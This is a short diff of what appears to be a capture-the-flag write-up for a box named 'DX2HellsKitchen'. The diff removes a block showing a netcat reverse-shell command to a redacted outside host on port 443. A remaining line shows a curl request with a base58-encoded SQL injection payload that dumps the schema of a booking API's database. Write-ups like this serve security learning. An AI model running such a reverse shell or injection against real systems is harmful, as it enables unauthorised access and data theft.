@@ -774,23 +774,6 @@ Sat 18 Oct 2025 10:15:26 PM UTC
 <br>
 <br>
 
-```bash
-:~/DX2HellsKitchen# cat s
-busybox nc xx.xx.xxx.xxx 443 -e sh
-```
-
-<img width="1145" height="469" alt="image" src="https://github.com/user-attachments/assets/d0c7167e-195b-4dc0-a873-c518830491bc" />
-
-
-<br>
-<br>
-
-<img width="1145" height="469" alt="image" src="https://github.com/user-attachments/assets/b3bfd64e-aebc-4a23-9d95-5ee40236ee2c" />
-
-<br>
-<br>
-<br>
-
 
 ```bash
 :~/DX2HellsKitchen# curl -s http://xx.xxx.xx.xx/api/booking-info?booking_key=$(echo -n "booking_id:2238907' UNION SELECT GROUP_CONCAT(sql, '\n'),2 FROM sqlite_schema;-- -" | base58)
